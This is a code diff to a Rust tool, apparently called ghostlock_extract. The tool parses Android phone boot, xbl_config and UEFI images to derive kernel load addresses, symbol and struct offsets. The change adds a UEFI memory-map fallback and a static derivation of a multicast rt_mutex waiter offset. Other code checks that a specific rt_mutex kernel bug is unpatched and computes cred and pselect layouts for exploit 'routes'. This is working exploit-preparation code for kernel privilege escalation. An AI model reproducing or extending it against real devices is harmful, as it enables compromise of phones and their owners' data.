@@ -10,10 +10,10 @@ use ghostlock_extract::boot::{BootImage, MTK_DEFAULT_PHYS_LOAD, MTK_VADDR_BASE};
 use ghostlock_extract::btf::Btf;
 use ghostlock_extract::derive::{
     PSELECT_ROUTE_NFDS, derive_cred_5x, derive_nf_logger_registration, derive_pselect_layout,
-    ensure_rtmutex_43499_unpatched, relative_symbols,
+    ensure_rtmutex_43499_unpatched, multicast_waiter_off, relative_symbols,
 };
 use ghostlock_extract::error::{ExtractError, Result};
-use ghostlock_extract::fdt::recover_kernel_phys_load;
+use ghostlock_extract::fdt::{recover_kernel_phys_load, recover_kernel_phys_load_from_uefi};
 use ghostlock_extract::kallsyms;
 use ghostlock_extract::kallsyms::Kallsyms;
 use ghostlock_extract::kallsyms_finder;
@@ -39,6 +39,10 @@ struct Cli {
     /// optional XBL xbl_config.img; derive kernel physical load from its FDT
     #[arg(long)]
     xbl_config: Option<PathBuf>,
+    /// optional UEFI uefi.img; derive kernel physical load from its platform
+    /// memory-map table when xbl_config carries no FDT memory map
+    #[arg(long)]
+    uefi: Option<PathBuf>,
     /// kernel physical load address (hex or decimal); overrides defaults
     #[arg(long, value_parser = parse_int)]
     phys: Option<u64>,
@@ -179,6 +183,7 @@ fn resolve_kallsyms(
 fn run(cli: &Cli) -> Result<i32> {
     let mut boot_path = cli.image.clone();
     let mut xbl_path = cli.xbl_config.clone();
+    let mut uefi_path = cli.uefi.clone();
     let work_root = cli.work_dir.clone().unwrap_or_else(std::env::temp_dir);
 
     if payload::looks_like_payload(cli.image.to_string_lossy().as_ref()) {
@@ -193,15 +198,20 @@ fn run(cli: &Cli) -> Result<i32> {
         eprintln!("info: analyzing partitions: {}", want.join(", "));
         let payload_view = payload::open_payload_for(&input, &work_dir, &want, download_progress())
             .map_err(|err| ExtractError::new(format!("{err:#}")))?;
-        let (extracted_boot, extracted_xbl) =
+        let (extracted_boot, extracted_xbl, extracted_uefi) =
             payload::extract_analysis_inputs(&payload_view, &work_dir)
                 .map_err(|err| ExtractError::new(format!("{err:#}")))?;
         boot_path = extracted_boot;
         xbl_path = extracted_xbl;
+        uefi_path = extracted_uefi;
         eprintln!(
-            "info: extracted boot={} xbl_config={} from payload",
+            "info: extracted boot={} xbl_config={} uefi={} from payload",
             boot_path.display(),
             xbl_path
+                .as_ref()
+                .map(|p| p.display().to_string())
+                .unwrap_or_else(|| "none".to_string()),
+            uefi_path
                 .as_ref()
                 .map(|p| p.display().to_string())
                 .unwrap_or_else(|| "none".to_string())
@@ -210,28 +220,36 @@ fn run(cli: &Cli) -> Result<i32> {
 
     let boot = BootImage::load(&boot_path)?;
     let mut phys_source = "unset";
-    let mut kernel_phys_load = if let Some(xbl) = &xbl_path {
+    let mut kernel_phys_load: Option<u64> = None;
+    if let Some(xbl) = &xbl_path {
         match recover_kernel_phys_load(xbl) {
             Ok(phys) => {
                 phys_source = "xbl_config FDT";
-                Some(phys)
+                kernel_phys_load = Some(phys);
             }
             Err(err) => {
-                eprintln!(
-                    "warning: xbl_config FDT parse failed: {err}; proceeding with boot-only analysis"
-                );
-                if cli.phys.is_some() {
-                    phys_source = "--phys";
-                }
-                cli.phys
+                eprintln!("warning: xbl_config FDT parse failed: {err}; trying the uefi memory map")
             }
         }
-    } else {
-        if cli.phys.is_some() {
-            phys_source = "--phys";
+    }
+    if kernel_phys_load.is_none() {
+        if let Some(uefi) = &uefi_path {
+            match recover_kernel_phys_load_from_uefi(uefi) {
+                Ok(phys) => {
+                    phys_source = "uefi memory map";
+                    eprintln!("info: kernel_phys_load=0x{phys:x} (uefi memory map)");
+                    kernel_phys_load = Some(phys);
+                }
+                Err(err) => eprintln!(
+                    "warning: uefi memory-map parse failed: {err}; proceeding with boot-only analysis"
+                ),
+            }
         }
-        cli.phys
-    };
+    }
+    if kernel_phys_load.is_none() && cli.phys.is_some() {
+        phys_source = "--phys";
+        kernel_phys_load = cli.phys;
+    }
 
     let btf_at = boot.embedded_btf_at();
     let ks = resolve_kallsyms(
@@ -520,12 +538,44 @@ fn run(cli: &Cli) -> Result<i32> {
                 suggested.map(str::to_string)
             }
         };
-        let geometry = route
+        let mut geometry = route
             .as_deref()
             .map(|route| {
                 report::conf_route_geometry(route, release_text, pselect_shift, &struct_offsets)
             })
             .unwrap_or_default();
+        // 5.x multicast: replace the proven-constant waiter_off with the value
+        // statically derived from this image's setsockopt/futex stack frames.
+        // No device or root is involved; the A301SO image reproduces its
+        // hardware-probed 0x60.
+        if route.as_deref() == Some("multicast_waiter") {
+            const MCAST_BUFFER_SIZE: u64 = 264;
+            const RT_MUTEX_WAITER_PI_TREE_ENTRY: u64 = 0x18;
+            match multicast_waiter_off(
+                &boot.kernel,
+                &rel_symbols,
+                &sorted_offsets,
+                MCAST_BUFFER_SIZE,
+                RT_MUTEX_WAITER_PI_TREE_ENTRY,
+            ) {
+                Ok(geom) => {
+                    eprintln!(
+                        "info: multicast waiter_off derived = 0x{:x} \
+                         (setsockopt depth 0x{:x} - futex depth 0x{:x})",
+                        geom.waiter_off, geom.setsockopt_depth, geom.waiter_depth
+                    );
+                    for entry in geometry.iter_mut() {
+                        if entry.0 == "waiter_off" {
+                            entry.1 = geom.waiter_off as i64;
+                        }
+                    }
+                }
+                Err(err) => eprintln!(
+                    "warning: static multicast waiter_off derivation failed: {err}; \
+                     keeping the proven 5.x constant"
+                ),
+            }
+        }
         match route.as_deref() {
             Some(route) if geometry.is_empty() => eprintln!(
                 "warning: no image-derived geometry for route {route}; writing an unverified \
@@ -576,8 +626,6 @@ fn run(cli: &Cli) -> Result<i32> {
         };
         let extra_offsets = report::ConfExtraOffsets {
             empty_zero_page: kallsyms::unique(&symbols, "empty_zero_page")
-                .and_then(|value| value.checked_sub(base)),
-            mcast_fake_bss: kallsyms::unique(&symbols, "z_pagemap_global")
                 .and_then(|value| value.checked_sub(base)),
         };
         report::render_conf(&report::ConfInputs {
